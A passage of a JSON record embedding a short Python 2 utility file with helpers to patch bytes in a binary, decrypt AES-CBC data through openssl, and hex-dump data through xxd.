          "content": "import subprocess, sys\n\ndef apply_patches(binary, patches):\n    for (offset, data) in patches:\n        binary = binary[:offset] + data + binary[offset + len(data):]\n    return binary\n\ndef aes_decrypt(data, iv, key):\n  if len(key) == 32:\n    aes = 128\n  elif len(key) == 64:\n    aes = 256\n  else:\n    print 'ERROR: Bad AES key given to aes_decrypt. Exiting.'\n    sys.exit(1)\n\n  p = subprocess.Popen(['openssl', 'enc', '-aes-%s-cbc' % aes, '-d', '-nopad', '-iv', iv, '-K', key],\n                       stdout=subprocess.PIPE,\n                       stdin=subprocess.PIPE,\n                       stderr=subprocess.PIPE)\n  (stdout, stderr) = p.communicate(input=data)\n\n  if p.returncode != 0 or len(stderr) > 0:\n    print 'ERROR: openssl failed: %s' % stderr\n    sys.exit(1)\n\n  return stdout\n\ndef hex_dump(data, address):\n  p = subprocess.Popen(['xxd', '-o', str(address)], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n  (stdout, stderr) = p.communicate(input=data)\n\n  if p.returncode != 0 or len(stderr) > 0:\n    print 'ERROR: xxd failed: %s' % stderr\n    sys.exit(1)\n\n  return stdout\n"
        }
      ]
    }
  ]
}